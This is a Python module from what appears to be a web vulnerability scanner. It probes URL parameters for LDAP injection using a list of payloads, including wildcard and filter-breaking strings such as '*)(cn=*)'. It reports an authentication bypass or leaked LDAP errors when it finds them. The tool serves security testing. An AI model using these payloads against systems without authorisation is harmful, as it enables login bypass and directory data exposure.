import asyncio
from modules.core import console

# LDAP Injection Payloads
# Common exploits:
# * -> Wildcard match (bypass password)
# )(cn=* -> Inject filter to match everything
# ! -> Error induction

LDAP_PAYLOADS = [
    "*",
    ")(&))",
    "*)(cn=*)",
    "*))%00",
    "admin*)((|userpassword=*)",
    "USER)(cn=admin))"
]

async def check_ldap(session, url, param):
    try:
        # 1. Login Bypass / Data Leak
        # We try injecting * into username or search fields
        for payload in LDAP_PAYLOADS:
            target = f"{url}?{param}={payload}"
            if "?" in url: target = f"{url}&{param}={payload}"
            
            async with session.get(target, timeout=5, ssl=False) as resp:
                text = await resp.text()
                
                # Indicators
                # 1. Login success (Welcome, Dashboard) when probing with simple wildcard
                if payload == "*" and ("Welcome" in text or "logout" in text.lower()):
                     return {
                        "url": target,
                        "param": param,
                        "type": "LDAP Injection (Auth Bypass)",
                        "payload": payload,
                        "evidence": "Login Success with Wildcard"
                    }
                
                # 2. LDAP Errors
                if "LDAPException" in text or "com.sun.jndi.ldap" in text or "search filter is invalid" in text:
                     return {
                        "url": target,
                        "param": param,
                        "type": "LDAP Injection (Error)",
                        "payload": payload,
                        "evidence": "LDAP Error Message Leaked"
                    }
                    
                # 3. Blind / Boolean differences (Complex to automate fully without baseline, skipping for speed)

    except Exception:
        pass
    return None

async def scan_ldap(session, url):
    """
    Scan for LDAP Injection (Directory Services).
    """
    console.print(f"\n[bold cyan]--- LDAP Injection Scanner ---[/bold cyan]")
    
    params = ["user", "username", "login", "search", "query", "filter", "cn", "name"]
    
    tasks = [check_ldap(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] LDAP INJECTION CONFIRMED: {res['param']}[/bold red]")
             console.print(f"      Type: {res['type']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No LDAP injection indicators found.[/dim]")
        
    return found
